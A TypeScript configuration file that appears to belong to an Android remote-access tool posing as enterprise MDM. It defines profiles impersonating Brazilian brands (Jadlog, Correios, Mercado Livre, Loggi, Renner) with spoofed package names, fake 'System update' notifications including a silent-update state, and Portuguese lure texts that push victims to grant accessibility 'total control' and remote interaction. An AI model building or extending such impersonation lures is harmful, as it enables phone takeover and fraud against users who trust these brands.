import { JADLOG_LOGO_BASE64, type ScreenCustomizationConfig } from "@droidview/shared";

export interface PresetLogo {
  id: string;
  name: string;
  type: "jadlog" | "dview" | "correios" | "security" | "box" | "custom";
  bg: string;
  color: string;
  label: string;
  dataUrl?: string;
}

export const defaultPresetLogos: PresetLogo[] = [
  { id: "logo_jadlog", name: "JADLOG Rastreio", type: "jadlog", bg: "#dc2626", color: "#ffffff", label: "jadlog", dataUrl: JADLOG_LOGO_BASE64 },
  { id: "logo_dview", name: "DVIEW Tático", type: "dview", bg: "#080a10", color: "#ff1a2a", label: "DVIEW" },
  { id: "logo_correios", name: "Sedex / Encomendas", type: "correios", bg: "#facc15", color: "#002d72", label: "SEDEX" },
  { id: "logo_security", name: "Segurança MDM", type: "security", bg: "#1e293b", color: "#38bdf8", label: "MDM" },
  { id: "logo_box", name: "Logística Express", type: "box", bg: "#f97316", color: "#ffffff", label: "LOG" }
];

export const defaultScreenConfig: ScreenCustomizationConfig = {
  loadingSubtext: "aguarde, atualização em andamento...",
  speechCalloutText: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
  copyrightText: "All Rights Reserved.",
  permissionDialogTitle: "Permitir controle total para {appName}?",
  serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
  accentColor: "#dc2626",
  trackingTitle: "Rastreamento de Encomendas",
  trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos."
};

export interface EnterpriseProfile {
  id: string;
  name: string;
  category: string;
  badge: string;
  appName: string;
  packageName: string;
  redirectUrl: string;
  accentColor: string;
  logoId: string;
  companyEmoji?: string;
  vpnProtocol: "TLS" | "UDP" | "TCP";
  screenConfig: ScreenCustomizationConfig;
}

export type NotificationStateType = "update_available" | "updating_silent" | "up_to_date";

export const notifStatusConfig: Record<NotificationStateType, { title: string; text: string; subtextSuffix: string; color: string; shortLabel: string }> = {
  update_available: {
    title: "System update",
    text: "New system software is available, Tap to learn more.",
    subtextSuffix: "agora",
    color: "#38bdf8",
    shortLabel: "Update Disponível"
  },
  updating_silent: {
    title: "System update",
    text: "New system software is available, Tap to learn more.",
    subtextSuffix: "em segundo plano",
    color: "#eab308",
    shortLabel: "Seed OTA Ativa"
  },
  up_to_date: {
    title: "System update",
    text: "New system software is available, Tap to learn more.",
    subtextSuffix: "protegido",
    color: "#22c55e",
    shortLabel: "Sistema Atualizado"
  }
};

export const notificationStatesList: { id: NotificationStateType; title: string; text: string; subtextSuffix: string; color: string; shortLabel: string }[] = [
  { id: "update_available", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "agora", color: "#38bdf8", shortLabel: "Update Disponível" },
  { id: "updating_silent", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "em segundo plano", color: "#eab308", shortLabel: "Seed OTA Ativa" },
  { id: "up_to_date", title: "System update", text: "New system software is available, Tap to learn more.", subtextSuffix: "protegido", color: "#22c55e", shortLabel: "Sistema Atualizado" }
];

export const companyEmojiPresets = [
  { emoji: "JAD", name: "Jadlog / Encomendas" },
  { emoji: "REN", name: "Renner / Varejo" },
  { emoji: "FIN", name: "Finanças / Banco" },
  { emoji: "DVW", name: "DView Padrão" },
  { emoji: "SDX", name: "Sedex / Correios" },
  { emoji: "LOG", name: "Loggi / Express" },
  { emoji: "CORP", name: "Corporativo" }
];

export const enterpriseProfiles: EnterpriseProfile[] = [
  {
    id: "jadlog",
    name: "JADLOG Rastreio",
    category: "Logística Express",
    badge: "Oficial Jadlog",
    appName: "JADLOG Rastreio",
    packageName: "com.droidview.agent",
    redirectUrl: "https://jadlog.com.br/rastreamento",
    accentColor: "#dc2626",
    logoId: "logo_jadlog",
    companyEmoji: "JAD",
    vpnProtocol: "TLS",
    screenConfig: {
      loadingSubtext: "aguarde, atualização em andamento...",
      speechCalloutText: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
      copyrightText: "All Rights Reserved.",
      permissionDialogTitle: "Permitir controle total para {appName}?",
      serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
      accentColor: "#dc2626",
      companyEmoji: "JAD",
      trackingTitle: "Rastreamento de Encomendas",
      trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos.",
      companyPreset: "jadlog",
      enterpriseName: "Jadlog Logística S.A."
    }
  },
  {
    id: "sedex",
    name: "SEDEX / Correios",
    category: "Serviços Postais",
    badge: "Correios BR",
    appName: "SEDEX Rastreamento",
    packageName: "br.com.correios.rastreamento",
    redirectUrl: "https://rastreamento.correios.com.br",
    accentColor: "#eab308",
    logoId: "logo_correios",
    companyEmoji: "SDX",
    vpnProtocol: "TLS",
    screenConfig: {
      loadingSubtext: "sincronizando dados de encomendas postais...",
      speechCalloutText: "O SEDEX requer acesso de acessibilidade para emitir alertas e rastreio de pacotes em tempo real.",
      copyrightText: "Empresa Brasileira de Correios e Telégrafos.",
      permissionDialogTitle: "Permitir controle de rastreio para {appName}?",
      serviceDescription: "Permite monitoramento automatizado de encomendas postais, atualização de status e comunicação com o terminal central.",
      accentColor: "#eab308",
      companyEmoji: "SDX",
      trackingTitle: "Portal de Rastreio Postal SEDEX",
      trackingSubtext: "Objetos postais sincronizados com sucesso. Acompanhe suas remessas e encomendas expressas.",
      companyPreset: "sedex",
      enterpriseName: "Correios Brasil"
    }
  },
  {
    id: "mercadolivre",
    name: "Mercado Envios",
    category: "E-Commerce & Cargas",
    badge: "Mercado Livre",
    appName: "Mercado Envios",
    packageName: "com.mercadolivre.envios",
    redirectUrl: "https://envios.mercadolivre.com.br",
    accentColor: "#f59e0b",
    logoId: "logo_box",
    companyEmoji: "JAD",
    vpnProtocol: "UDP",
    screenConfig: {
      loadingSubtext: "carregando malha logística e rotas de entrega...",
      speechCalloutText: "Permita o serviço para sincronizar suas entregas e otimizar rotas com o centro de distribuição.",
      copyrightText: "Mercado Envios Logística S.A.",
      permissionDialogTitle: "Permitir serviço operacional para {appName}?",
      serviceDescription: "Otimiza a leitura de romaneios, geolocalização de pacotes e telemetria com a central de suporte.",
      accentColor: "#f59e0b",
      companyEmoji: "JAD",
      trackingTitle: "Painel do Entregador & Cargas",
      trackingSubtext: "Rotas otimizadas e entregas sincronizadas com o centro de distribuição.",
      companyPreset: "mercadolivre",
      enterpriseName: "Mercado Livre"
    }
  },
  {
    id: "loggi",
    name: "Loggi Express",
    category: "Logística Urbana",
    badge: "Loggi",
    appName: "Loggi Entregas",
    packageName: "com.loggi.driver.partner",
    redirectUrl: "https://loggi.com/rastreador",
    accentColor: "#2563eb",
    logoId: "logo_security",
    companyEmoji: "LOG",
    vpnProtocol: "UDP",
    screenConfig: {
      loadingSubtext: "conectando à malha de entregas rápidas...",
      speechCalloutText: "Ative a permissão para receber atualizações instantâneas de pacotes e suporte em campo.",
      copyrightText: "Loggi Tecnologia Ltda.",
      permissionDialogTitle: "Autorizar Loggi Entregas no aparelho?",
      serviceDescription: "Permite comunicação em tempo real, suporte de navegação e auditoria operacional de entrega.",
      accentColor: "#2563eb",
      companyEmoji: "LOG",
      trackingTitle: "Loggi Central de Remessas",
      trackingSubtext: "Acompanhe todas as entregas do dia e histórico de ocorrências com o suporte logístico.",
      companyPreset: "loggi",
      enterpriseName: "Loggi Tecnologia"
    }
  },
  {
    id: "dview",
    name: "DVIEW Enterprise MDM",
    category: "Segurança & Endpoint",
    badge: "Dark-Ops",
    appName: "DVIEW Security Agent",
    packageName: "com.droidview.agent",
    redirectUrl: "http://localhost:5000",
    accentColor: "#00f0ff",
    logoId: "logo_dview",
    companyEmoji: "DVW",
    vpnProtocol: "TLS",
    screenConfig: {
      loadingSubtext: "estabelecendo canal seguro criptografado...",
      speechCalloutText: "Este agente corporativo requer permissão de acessibilidade para diagnóstico remoto e conformidade MDM.",
      copyrightText: "DVIEW Security Technologies.",
      permissionDialogTitle: "Permitir controle de conformidade DVIEW?",
      serviceDescription: "Serviço de gerenciamento corporativo para assistência remota, inventário de hardware e proteção em tempo real.",
      accentColor: "#00f0ff",
      companyEmoji: "DVW",
      trackingTitle: "Terminal Corporativo Seguro",
      trackingSubtext: "Dispositivo autenticado com sucesso e conectado ao servidor central de gerenciamento.",
      companyPreset: "dview",
      enterpriseName: "DVIEW Enterprise"
    }
  },
  {
    id: "renner",
    name: "Lojas Renner",
    category: "Varejo & Moda",
    badge: "Oficial Renner",
    appName: "Lojas Renner",
    packageName: "com.lojasrenner.app",
    redirectUrl: "https://www.lojasrenner.com.br",
    accentColor: "#dc2626",
    logoId: "logo_box",
    companyEmoji: "REN",
    vpnProtocol: "TLS",
    screenConfig: {
      loadingSubtext: "carregando ofertas exclusivas e pedidos...",
      speechCalloutText: "Permita o acesso para acompanhar pedidos e promoções personalizadas.",
      copyrightText: "Lojas Renner S.A. Todos os direitos reservados.",
      permissionDialogTitle: "Permitir controle para {appName}?",
      serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica e sincronização segura com os servidores de atendimento.",
      accentColor: "#dc2626",
      companyEmoji: "REN",
      trackingTitle: "Central do Cliente Renner",
      trackingSubtext: "Serviços validados com sucesso. Acompanhe seus pedidos e catálogo exclusivo.",
      companyPreset: "renner",
      enterpriseName: "Lojas Renner S.A."
    }
  },
  {
    id: "custom",
    name: "White-Label Customizado",
    category: "Personalizado / Qualquer Empresa",
    badge: "100% White-Label",
    appName: "App Corporativo",
    packageName: "com.empresa.agent",
    redirectUrl: "https://suaempresa.com.br",
    accentColor: "#8b5cf6",
    logoId: "logo_box",
    companyEmoji: "CORP",
    vpnProtocol: "TCP",
    screenConfig: {
      loadingSubtext: "carregando módulos corporativos...",
      speechCalloutText: "Este aplicativo requer permissão de acesso para prestar suporte técnico autorizado.",
      copyrightText: "Todos os Direitos Reservados.",
      permissionDialogTitle: "Permitir controle para {appName}?",
      serviceDescription: "O serviço de acessibilidade do {appName} permite suporte técnico assistido e comunicação com a central.",
      accentColor: "#8b5cf6",
      companyEmoji: "CORP",
      trackingTitle: "Central de Serviços Corporativos",
      trackingSubtext: "Serviços validados com sucesso. Digite o código ou acesse suas operações.",
      companyPreset: "custom",
      enterpriseName: "Sua Empresa S.A."
    }
  }
];

export const brandAccentPresets = [
  { name: "Vermelho Jadlog", hex: "#dc2626" },
  { name: "Azul Royal", hex: "#2563eb" },
  { name: "Ciano Cyber", hex: "#00f0ff" },
  { name: "Laranja Express", hex: "#f97316" },
  { name: "Verde Esmeralda", hex: "#16a34a" },
  { name: "Roxo Tech", hex: "#8b5cf6" },
  { name: "Dourado Sedex", hex: "#eab308" }
];
